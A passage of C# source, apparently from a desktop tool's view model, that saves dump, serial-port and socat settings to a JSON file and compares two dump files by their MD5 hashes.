                    DelaySeconds = this.DelaySeconds,
                    DumpAddress = this.DumpAddress,
                    DumpLength = this.DumpLength,
                    CompareFolder = this.CompareFolder,
                    CompareFile1 = this.CompareFile1,
                    CompareFile2 = this.CompareFile2,
                    SelectedSerialPort = this.SelectedSerialPort,
                    SocatTcpPort = this.SocatTcpPort,
                    SelectedBaudRate = this.SelectedBaudRate,
                    SelectedParity = this.SelectedParity,
                    SelectedStopBits = this.SelectedStopBits,
                    SelectedFlowControl = this.SelectedFlowControl
                };
                var options = new System.Text.Json.JsonSerializerOptions { WriteIndented = true };
                string json = System.Text.Json.JsonSerializer.Serialize(config, options);
                System.IO.File.WriteAllText(path, json);
            }
            catch (Exception ex)
            {
                Logging.Log($"Could not save configuration: {ex.Message}", LogCategory.Error);
            }
        }

        /// <summary>
        /// Compares two selected dump files.
        /// </summary>
        private async Task CompareTwoFiles()
        {
            if (!System.IO.File.Exists(CompareFile1) || !System.IO.File.Exists(CompareFile2))
            {
                await _dialogService.ShowMessageAsync("Error", "Please select two valid files.");
                return;
            }

            IsComparing = true;
            try
            {
                var comparer = new S7.Utils.DumpComparer();
                string hashA = await comparer.ComputeFileHashAsync(CompareFile1);
                string hashB = await comparer.ComputeFileHashAsync(CompareFile2);
                bool match = hashA == hashB;
                var sb = new System.Text.StringBuilder();
                sb.AppendLine($"File 1: {System.IO.Path.GetFileName(CompareFile1)}");
                sb.AppendLine($"MD5: {hashA}");
                sb.AppendLine($"File 2: {System.IO.Path.GetFileName(CompareFile2)}");
                sb.AppendLine($"MD5: {hashB}");
                sb.AppendLine(match ? "=> MATCH" : "=> DIFFER");

                await _dialogService.ShowMessageAsync("Comparison Result", sb.ToString());
                Logging.Log("Comparison complete. See popup for detailed result.");
            }
            catch (Exception ex)
            {
                await _dialogService.ShowMessageAsync("Error", $"Error during file compare: {ex.Message}");
                Logging.Log($"Error during file compare: {ex.Message}", LogCategory.Error);
            }
            finally
            {
                IsComparing = false;
            }
        }
    }
}
